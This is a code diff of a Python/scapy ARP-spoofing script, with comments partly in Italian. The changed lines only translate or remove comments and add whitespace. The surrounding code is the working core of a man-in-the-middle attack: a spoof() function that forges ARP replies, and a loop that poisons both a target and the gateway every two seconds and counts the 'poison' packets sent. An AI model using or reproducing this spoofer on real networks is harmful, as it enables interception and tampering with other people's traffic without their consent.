@@ -63,7 +63,9 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet, verbose=False)  # metto verbose per non far spawnnare una scritta ogni secondo
+    scapy.send(packet, verbose=False)  # verbose-false to not make a message appear every second
+
+
 
 
 def restore(destination_ip, source_ip):
@@ -82,8 +84,8 @@ try:
         spoof(gateway_ip, target_ip)
         sent_packet_count = sent_packet_count + 2  # questo e figo
         print(colored("<> 🧪 Poison sent: " + str(sent_packet_count),
-                      "green"))  # per sovrascrivere una linea (numero 1-2-3...) fare cosi print(("lnbaablblbaba"), end="")
-        time.sleep(2)  # secondi
+                      "green"))  # per sovrascrivere una linea (numero 1-2-3...) fare cosi print(("ifkrfmrmeifnernijerng"), end="")
+        time.sleep(2) 
 except KeyboardInterrupt:
     print(colored("  >< Detected CTRL + C", "blue"))
     time.sleep(0.5)
